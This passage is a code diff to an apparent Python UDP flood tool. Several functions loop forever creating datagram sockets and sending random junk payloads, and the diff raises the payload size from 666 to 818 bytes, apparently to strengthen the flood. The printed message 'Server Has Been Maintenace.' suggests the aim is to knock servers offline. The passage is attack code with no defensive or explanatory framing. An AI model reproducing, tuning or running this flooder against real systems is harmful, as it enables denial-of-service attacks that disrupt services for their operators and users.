@@ -40,7 +40,7 @@ def run2():
 			print(" | Server Has Been Maintenace. | ")
 
 def run3():
-	data = random._urandom(666)
+	data = random._urandom(818)
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -136,7 +136,7 @@ def run10():
 			print(" | Server Has Been Maintenace. | ")
 
 def run11():
-	data = random._urandom(666)
+	data = random._urandom(818)
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -184,7 +184,7 @@ def run14():
 			print(" | Server Has Been Maintenace. | ")
 
 def run15():
-	data = random._urandom(666)
+	data = random._urandom(818)
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -292,7 +292,7 @@ def run23():
 			print(" | Server Has Been Maintenace. | ")
 
 def run24():
-	data = random._urandom(666)
+	data = random._urandom(818)
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
